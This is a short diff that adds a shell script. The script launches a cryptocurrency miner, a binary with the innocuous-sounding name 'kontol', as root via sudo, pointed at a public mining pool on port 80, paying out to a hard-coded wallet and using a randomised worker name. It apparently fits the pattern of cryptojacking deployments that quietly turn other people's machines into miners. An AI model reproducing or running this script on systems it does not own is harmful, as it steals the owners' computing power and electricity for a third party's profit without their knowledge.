@@ -1,0 +1,9 @@
+POOL=pool.hashvault.pro:80
+
+WALLET=TRTLv2zcCvhGLNapck1NKJ8bckuWx63mpGx59iY4wcer8RoAndB9wjNXTJuaYzH8BuFqJWGAGPNFKAqJHY6TqsvTJ5jnTq4hk9V
+
+WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
+
+ALGO=wrkzcoin
+
+sudo ./kontol --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO
